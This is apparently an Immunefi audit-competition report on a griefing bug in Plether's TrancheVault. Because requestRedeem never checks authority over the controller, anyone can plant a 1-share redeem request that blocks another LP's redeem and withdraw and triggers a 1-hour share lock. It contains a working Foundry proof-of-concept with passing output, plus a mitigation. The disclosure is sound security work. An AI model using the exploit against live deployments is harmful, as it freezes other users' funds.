# \#99843 [SC-Low] Anyone can put a 1-share redeem request at the front of another LP's queue, blocking their redeem and withdraw and locking their shares for 1 hour to clear it

**Submitted on Nov 15th 2026 at 12:44:12 UTC by @Audittens for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99843
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro

Each LP has a queue of redeem requests, and the vault's standard ERC-4626 `redeem` and `withdraw` claim from the request at its front (the head). `requestRedeem` checks that the caller may spend the owner's shares, but lets the caller name any address as the controller, the account the request belongs to. An attacker can therefore file a 1-share request in another LP's name. Settlement refunds it instead of paying it, and it stays at the front of the LP's queue. From then on `redeem` and `withdraw` fail for that LP, and removing the request through `claimRedeemRefund` restarts the LP's 1-hour share cooldown.

## Vulnerability Details

`requestRedeem` checks the owner's cooldown, the owner's balance and the caller's authority over the owner's shares. It never checks the caller's authority over `controller`, and adds the request to that controller's queue:

[packages/perps/src/TrancheVault.sol:625-630](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L625-L630)
```solidity
if (msg.sender != owner && !isOperator[owner][msg.sender]) {
    _spendAllowance(owner, msg.sender, shares);
}
_transfer(owner, address(this), shares);

requestId = _enqueueRedeemRequest(shares, controller);
```

A 1-share request passes the minimum-size check because it [is the owner's whole balance](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1615-L1617). If the victim has no request in that epoch, it becomes the head of the victim's queue.

At settlement, `HousePool._fundRedemptionPhase` values the head epoch. One share is worth less than one USDG atom, so when it is the first head of the phase the pool [refunds it](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L957-L970) through `refundRedeemEpochRemainder` instead of funding it. The refunded request stays at the head of the victim's queue.

`redeem` and `withdraw` claim only from the head, and `maxRedeem` and `maxWithdraw` read the [same request](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1299-L1311):

[packages/perps/src/TrancheVault.sol:998-1012](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L998-L1012)
```solidity
function withdraw(
    uint256 assets,
    address receiver,
    address controller
) public override returns (uint256 shares) {
    return _claimWithdraw(controllerRedeemHead[controller], assets, receiver, controller);
}

function redeem(
    uint256 shares,
    address receiver,
    address controller
) public override returns (uint256 assets) {
    return _claimRedeem(controllerRedeemHead[controller], shares, receiver, controller);
}
```

The planted head has nothing to claim, so both revert, and `maxRedeem` and `maxWithdraw` return 0 even when a later request of the victim is fully funded. These two functions are the claim path the project's entry-point guide [gives LPs](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L191-L192). The victim's only way to remove the head is [`claimRedeemRefund`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L916-L947). It delivers the share to the controller and sets the controller's `lastDepositTime` to now, and for the next hour [transfers revert](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L325-L327) and `requestRedeem` reverts.

This is a way around the fix of LOW-39 and LOW-40, on pages 148 and 150 of the [Cecuro report](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf). Those findings let a caller push dust shares and a cooldown onto an unrelated receiver; the fix requires `receiver == controller` on share-delivering claims, so the controller is the only possible recipient. Here the attacker chooses the controller itself, at `requestRedeem`, which has no such check, and the victim's own refund claim then delivers the dust and the cooldown to the victim.

### Attack scenario

1. The victim holds 100,000 USDG of Junior shares. The attacker deposits, waits out its cooldown and moves 1 share to a second address.
2. The second address calls `TrancheVault.requestRedeem(1, victim, itself)`. The request becomes the head of the victim's queue.
3. After the epoch matures, anyone calls `OrderRouter.settleLpEpoch`. The 1-share head is worth 0 USDG and is refunded, not paid.
4. The victim requests to redeem half its shares, about 50,000 USDG, in a later epoch, and that epoch is funded.
5. The victim calls `redeem` for the funded shares and it reverts with `ERC4626ExceededMaxRedeem(victim, shares, 0)`; `withdraw` reverts too, and `maxRedeem` returns 0.
6. The victim calls `claimRedeemRefund` on the planted request. The head is removed, but the victim's remaining shares, about 50,000 USDG, cannot be transferred or put into a new redeem request for 1 hour.
7. When the hour ends, the victim claims through `redeem` and the attacker plants another request for 1 share. The victim's next funded redemption is blocked the same way, and `maxRedeem` is 0 again.

A controller contract that claims through `redeem`, as the ERC-4626 and ERC-7540 interfaces lead integrators to do, and has no operator, cannot call `claimRedeemRefund` or claim by request id. In the second test such a contract has 99,999 USDG funded and `redeem` reverts; it stays frozen until it is upgraded or given an operator.

## Impact Details

Griefing, and a temporary freeze of at least 1 hour. After an attacker plants a 1-share request in an LP's name, the LP's funded redemption cannot be claimed through `redeem` or `withdraw`, and removing the request locks all of the LP's shares for 1 hour. A controller contract that claims only through `redeem` cannot reach its USDG at all until it is changed. The attacker spends 1 share and gas each time and gains nothing.

The funded USDG of an ordinary LP is not lost and not stuck for good: an LP who knows the plant can still claim a funded request by id through `claimRedeem(requestId, ...)` and leave the head in place. That LP can then never use `redeem` or `withdraw` again, the two functions the project's entry-point guide names for claiming, and `maxRedeem` and `maxWithdraw` report 0 to any interface or integration that reads them. The 1-hour lock follows from clearing the request, the only way to get the standard path back. The attacker can repeat the plant every time the victim clears it, for 1 share, worth about 1e-9 USDG, plus gas.

Conditions:
- The victim must have no redeem request in the epoch the attacker plants in, or the share merges into the victim's request.
- For the refund, the planted request must be the only request of its epoch, or the first processed with nothing funded before it. Otherwise it is funded with 0 USDG and only `withdraw` is blocked.
- A controller contract is frozen only if it exposes nothing but the standard claim functions and has no operator.

## Recommended Mitigation

In `requestRedeem`, require the caller to be authorized for `controller`, by calling `_requireControllerAuth(controller)` next to the owner check, so no one can add requests to another account's queue. Independently, let `redeem` and `withdraw` skip refunded requests at the head instead of reverting.

## References

- [TrancheVault.sol:606-632](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L632)
- [TrancheVault.sol:998-1012](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L998-L1012)
- [TrancheVault.sol:916-947](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L916-L947)
- [HousePool.sol:957-970](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L957-L970)

## Proof of Concept

The first test runs steps 1 to 7 of the attack scenario. The second test runs the controller-contract case: a contract that claims only through `redeem` and has no operator. Both log the funded USDG the victim cannot claim through `redeem`, and the first test also logs the value of the shares locked for 1 hour.

Paste the code into `test/POC.t.sol` at the repository root and run:

```bash
forge test --match-path test/POC.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../packages/perps/test/perps/BasePerpTest.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {console} from "forge-std/console.sol";

/// @dev A controller contract that claims its redemptions through the standard ERC-4626 `redeem` and has no operator.
contract ControllerContract {

    TrancheVault internal immutable vault;

    constructor(TrancheVault vault_) {
        vault = vault_;
    }

    function requestRedeem(uint256 shares) external returns (uint256) {
        return vault.requestRedeem(shares, address(this), address(this));
    }

    function redeemAll() external returns (uint256) {
        return vault.redeem(vault.maxRedeem(address(this)), address(this), address(this));
    }

}

contract Test is BasePerpTest {

    address internal victim = makeAddr("victim");
    address internal attacker = makeAddr("attacker");
    address internal attackerSecondAddress = makeAddr("attacker's second address");

    function test_plantedRequestBlocksVictimsRedeem() public {
        // Step 1: the victim holds 100,000 USDG of Junior shares. The attacker deposits, waits out its cooldown and
        // moves 1 share to a second address.
        _fundJunior(victim, 100_000e6);
        _fundJunior(attacker, 1000e6);
        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN());

        // Steps 2 and 3: the second address files a 1-share redeem request with the victim as controller. Settlement
        // refunds it instead of paying it, and it stays at the head of the victim's queue.
        uint256 plantedId = _plantRequest(victim);

        // Step 4: the victim requests to redeem half its shares in a later epoch, and that epoch is funded.
        uint256 half = juniorVault.balanceOf(victim) / 2;
        vm.prank(victim);
        uint256 victimId = juniorVault.requestRedeem(half, victim, victim);
        _settleEpochOf(victimId);
        uint256 fundedShares = juniorVault.claimableRedeemRequest(victimId, victim);

        // Step 5: `redeem` and `withdraw` revert for the victim, and `maxRedeem` is 0.
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, victim, fundedShares, 0));
        vm.prank(victim);
        juniorVault.redeem(fundedShares, victim, victim);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxWithdraw.selector, victim, 1e6, 0));
        vm.prank(victim);
        juniorVault.withdraw(1e6, victim, victim);
        console.log("victim's funded redemption (USDG):          ", juniorVault.claimableRedeemAssets(victimId, victim) / 1e6);
        console.log("victim's maxRedeem with the planted request:", juniorVault.maxRedeem(victim));

        // Step 6: the victim removes the planted request with `claimRedeemRefund`. For 1 hour its remaining shares
        // cannot be transferred or put into a new redeem request.
        vm.startPrank(victim);
        juniorVault.claimRedeemRefund(plantedId, victim, victim);
        uint256 lockedShares = juniorVault.balanceOf(victim);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(attacker, lockedShares);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(lockedShares, victim, victim);
        vm.stopPrank();
        console.log("victim's shares locked for 1 hour (USDG):   ", juniorVault.convertToAssets(lockedShares) / 1e6);

        // Step 7: when the hour ends the victim claims through `redeem`, and the attacker plants another 1-share
        // request. The victim's next funded redemption is blocked the same way.
        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN());
        vm.prank(victim);
        juniorVault.redeem(fundedShares, victim, victim);
        _plantRequest(victim);
        vm.prank(victim);
        uint256 nextId = juniorVault.requestRedeem(lockedShares, victim, victim);
        _settleEpochOf(nextId);
        console.log("victim's next funded redemption (USDG):     ", juniorVault.claimableRedeemAssets(nextId, victim) / 1e6);
        console.log("victim's maxRedeem after the second plant:  ", juniorVault.maxRedeem(victim));
    }

    function test_plantedRequestFreezesControllerContract() public {
        ControllerContract controller = new ControllerContract(juniorVault);
        _fundJunior(address(controller), 100_000e6);
        _fundJunior(attacker, 1000e6);
        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN());

        // The attacker plants a 1-share request in the controller contract's queue.
        _plantRequest(address(controller));

        // The controller contract redeems all its shares, and that epoch is funded.
        uint256 redeemId = controller.requestRedeem(juniorVault.balanceOf(address(controller)));
        _settleEpochOf(redeemId);

        // Its `redeem` reverts, and it has no other way to claim.
        vm.expectRevert();
        controller.redeemAll();
        console.log(
            "controller's funded redemption (USDG):",
            juniorVault.claimableRedeemAssets(redeemId, address(controller)) / 1e6
        );
        console.log("controller's USDG received:           ", settlementToken.balanceOf(address(controller)));
    }

    /// @dev The attacker moves 1 share to its second address, which files a redeem request naming `controller`, and
    ///      the epoch is settled.
    function _plantRequest(address controller) internal returns (uint256 plantedId) {
        vm.prank(attacker);
        juniorVault.transfer(attackerSecondAddress, 1);
        vm.prank(attackerSecondAddress);
        plantedId = juniorVault.requestRedeem(1, controller, attackerSecondAddress);
        _settleEpochOf(plantedId);
    }

    /// @dev Anyone settles the epoch of `requestId` once it matures.
    function _settleEpochOf(uint256 requestId) internal {
        vm.warp(juniorVault.depositEpochStart(requestId));
        router.settleLpEpoch(_mockPythUpdateData(1e8));
    }

}
```

Output:

```
Ran 2 tests for test/POC.t.sol:Test
[PASS] test_plantedRequestBlocksVictimsRedeem() (gas: 3989099)
Logs:
  victim's funded redemption (USDG):           49999
  victim's maxRedeem with the planted request: 0
  victim's shares locked for 1 hour (USDG):    49999
  victim's next funded redemption (USDG):      49999
  victim's maxRedeem after the second plant:   0

[PASS] test_plantedRequestFreezesControllerContract() (gas: 2969009)
Logs:
  controller's funded redemption (USDG): 99999
  controller's USDG received:            0

Suite result: ok. 2 passed; 0 failed; 0 skipped
```
